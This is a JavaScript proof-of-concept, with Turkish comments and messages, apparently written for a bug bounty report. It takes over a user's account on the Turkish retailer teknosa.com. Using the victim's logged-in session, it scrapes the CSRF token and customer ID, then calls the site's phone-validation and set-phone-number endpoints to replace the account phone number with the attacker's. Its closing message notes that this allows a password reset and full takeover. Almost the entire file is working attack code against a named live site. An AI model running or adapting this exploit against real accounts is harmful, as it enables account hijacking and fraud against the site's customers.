/* 

Bu script, teknosa.com üzerindeki bir kullanıcının telefon numarasını değiştirerek hesabi ele geçirmek için kullanılır. Bug bounty raporu için hazırlanmıştır.

@efkan

*/

run();

async function run() {
  const res = await fetch('https://www.teknosa.com/hesabim/uyelik-bilgilerim', {
    credentials: 'include',
  });
  const data = await res.text();
  const parser = new DOMParser();
  const doc = parser.parseFromString(data, 'text/html');
  const csrfToken = doc.querySelector('input[name="CSRFToken"]')?.value;
  const customerId = doc.querySelector('input[name="customerId"]')?.value;
  const firstName = doc.querySelector('input[id="uin_firstname"]')?.value;
  const lastName = doc.querySelector('input[id="uin_lastname"]')?.value;

  if (!csrfToken || !customerId) {
    alert('CSRF Token veya Customer ID bulunamadı. Lütfen tekrar deneyiniz.');
    return;
  }

  alert(
    `CSRF Tokeniniz: ${csrfToken}\nCustomer ID'niz: ${customerId}. \nŞimdi telefon numaranızı güncelleyeceğiz.`,
  );

  const phoneNumberToUpdate = prompt(
    'Saldırganın telefon numarasını giriniz, bir doğrulama kodu gönderilecektir.',
  );
  const sendPhoneValidationData = await sendPhoneValidation(
    phoneNumberToUpdate,
    customerId,
    csrfToken,
  );
  if (sendPhoneValidationData.status !== 'success') {
    alert('Telefon numarası doğrulama kodu gönderilemedi.');
    return;
  }
  alert(
    `Doğrulama kodu ${phoneNumberToUpdate} numarasına gönderildi. Gelen mesajdaki adımları takip et ve çıkan doğrulama kodunu bir sonraki adımda gireceksin.`,
  );
  const smsValidationCode = prompt('Doğrulama kodunu giriniz.');
  const updatePhoneValidationData = await updatePhoneValidation(
    phoneNumberToUpdate,
    smsValidationCode,
    csrfToken,
  );
  if (updatePhoneValidationData.status !== 'success') {
    alert('Telefon numarası güncellenemedi.');
    return;
  }

  const response = await setPhoneNumber(
    phoneNumberToUpdate,
    smsValidationCode,
    csrfToken,
  );

  if (!response.ok) {
    alert('Telefon numarası güncellenemedi.');
    return;
  }
  alert(
    'Telefon numarası başarıyla güncellendi ve artık kurbanın hesabının telefon numarası saldırgana geçti. Saldırgan şifremi unuttum özelliğinden yararlanarak yeni telefon numarasına şifre sıfırlama kodu gönderip şifreyi değiştirebilir.',
  );
}

async function sendPhoneValidation(phoneNumber, customerId, csrfToken) {
  const res = await fetch('https://www.teknosa.com/hesabim/sendPhoneValidation', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json; charset=UTF-8',
      'x-requested-with': 'XMLHttpRequest',
      csrftoken: csrfToken,
    },
    body: JSON.stringify({
      phoneNumber: phoneNumber,
      customerId: customerId,
    }),
  });
  const data = await res.json();
  return data;
}

async function updatePhoneValidation(phoneNumber, smsValidationCode, csrfToken) {
  const res = await fetch('https://www.teknosa.com/hesabim/update-phone-validation', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json; charset=UTF-8',
      'x-requested-with': 'XMLHttpRequest',
      csrftoken: csrfToken,
    },
    body: JSON.stringify({
      phoneNumber: phoneNumber,
      smsValidationCode: smsValidationCode,
    }),
  });
  const data = await res.json();
  return data;
}

async function setPhoneNumber(phoneNumber, smsValidationCode, csrfToken) {
  const phoneNumberFormatted = `(${phoneNumber.slice(0, 3)}) ${phoneNumber.slice(
    3,
    6,
  )} ${phoneNumber.slice(6, 8)} ${phoneNumber.slice(8, 10)}`;

  const res = await fetch('https://www.teknosa.com/hesabim/set-phone-number', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      smsValidationCode: smsValidationCode,
      phoneNumber: phoneNumberFormatted,
      CSRFToken: csrfToken,
    }),
  });
  return res;
}
